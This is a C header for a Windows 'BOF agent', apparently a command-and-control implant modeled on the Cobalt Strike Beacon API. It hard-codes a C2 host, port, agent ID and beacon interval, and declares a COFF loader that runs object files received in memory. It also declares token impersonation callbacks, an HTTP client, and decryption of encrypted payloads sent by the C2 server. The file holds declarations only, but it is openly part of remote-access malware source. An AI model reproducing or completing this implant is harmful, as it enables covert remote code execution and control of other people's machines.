/*
 * agent.h - Shared declarations for BOF Agent
 *
 * Used by: beacon_api.c, coff_loader.c, http_client.c, main.c
 */

#ifndef _AGENT_H_
#define _AGENT_H_

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>

/* ====== BUILD-TIME CONFIG (set by build.sh) ====== */
#ifndef C2_HOST
#  define C2_HOST "192.168.81.128"
#endif
#ifndef C2_PORT
#  define C2_PORT 8080
#endif
#ifndef AGENT_ID
#  define AGENT_ID "WIN_BOT_001"
#endif
#ifndef SLEEP_SEC
#  define SLEEP_SEC 5
#endif

#define BUFSZ       65536
#define OUTPUTSZ    (4 * 1024 * 1024)   /* 4 MB max output buffer (heap-allocated) */
#define HTTP_TIMEOUT_MS  5000

/* ====== Forward decl: datatype used by Beacon API ====== */
typedef struct {
    char  original;
    char  buffer[256];
    int   length;
    int   size;
} datatype;

/* ====== Beacon API callbacks (called by BOFs) ====== */
/* Implemented in beacon_api.c */
void  BeaconDataParse(datatype* args, char* buffer, int size);
int   BeaconDataInt(datatype* args);
short BeaconDataShort(datatype* args);
char  BeaconDataByte(datatype* args);
char* BeaconDataExtract(datatype* args, int* size);
void  BeaconPrintf(int type, const char* fmt, ...);
void  BeaconOutput(int type, const char* data, int len);
BOOL  BeaconIsAdmin(void);
void  BeaconGetSpawnTo(char* buffer, int length);
BOOL  BeaconUseToken(HANDLE token);
void  BeaconRevertToken(void);

/* ====== Output buffer (used by coff_loader.c and main.c) ====== */
/* Implemented in beacon_api.c */
extern char*  g_output_buf;
extern size_t g_output_len;
extern size_t g_output_cap;
extern DWORD  g_last_exception;

void   output_append(const char* str, size_t len);
void   output_reset(void);

/* ====== VEH (Vectored Exception Handler) ====== */
LONG WINAPI veh_handler(PEXCEPTION_POINTERS ep);
void  veh_register(void);

/* ====== CRT fallbacks (implemented in beacon_api.c) ====== */
void* bof_memset(void* dst, int val, size_t n);
void* bof_memcpy(void* dst, const void* src, size_t n);
void* bof_memmove(void* dst, const void* src, size_t n);

/* ====== Argument buffer state ====== */
typedef struct {
    char* base;
    int   size;
    int   cursor;
} ARG_STATE;
extern ARG_STATE g_args;

/* ====== COFF structures (subset, enough for x64 BOFs) ====== */
#pragma pack(push, 2)
typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFF_FILE_HEADER;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} SECTION_HEADER;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
} RELOCATION;

typedef struct {
    union {
        char ShortName[8];
        struct {
            uint32_t Zeroes;
            uint32_t Offset;
        } Name;
    } Name;
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
} SYMBOL_ENTRY;
#pragma pack(pop)

#define IMAGE_REL_AMD64_ADDR64    0x0001
#define IMAGE_REL_AMD64_ADDR32NB  0x0003
#define IMAGE_REL_AMD64_REL32     0x0004
#define IMAGE_REL_AMD64_REL32_1   0x0005
#define IMAGE_REL_AMD64_REL32_2   0x0006
#define IMAGE_REL_AMD64_REL32_3   0x0007
#define IMAGE_REL_AMD64_REL32_4   0x0008
#define IMAGE_REL_AMD64_REL32_5   0x0009

/* ====== COFF loader API (implemented in coff_loader.c) ====== */
/* Returns 0 on success, non-zero on failure (with error in output buffer). */
int bof_exec(uint8_t* coff_data, size_t coff_size, char* args, int args_len);

/* ====== HTTP client API (implemented in http_client.c) ====== */
/* Returns 0 on success, negative on error. */
int http_request(const char* method, const char* path,
                 const char* body, int body_len,
                 char* resp_buf, int resp_cap, int* resp_len);

/* JSON helper - extract string value for a key from a small JSON response */
int json_find_str(const char* json, const char* key, char* out, int out_cap);

/* Base64 encoder (heap-allocated, returns malloc'd string or NULL) */
char* base64_encode(const char* data, size_t len);

/* Base64 decoder (heap-allocated, returns malloc'd buffer or NULL) */
uint8_t* base64_decode(const char* b64, int* out_len);

/* ====== Crypto (Phase 3) ====== */
/* Initialize with PSK (build-time) + salt (per-session).
 * Returns 0 on success. */
int crypto_init(const uint8_t* salt, int salt_len);

/* Decrypt BOF payload (encrypted with HKDF-derived keys).
 * wire: [12B nonce][N bytes ciphertext+16B tag]
 * Returns plaintext length on success, negative on error. */
int crypto_decrypt_bof_payload(const uint8_t* wire, int wire_len,
                                uint8_t* plaintext_out, int plaintext_cap);

/* Wipe keys from memory */
void crypto_cleanup(void);

#endif /* _AGENT_H_ */
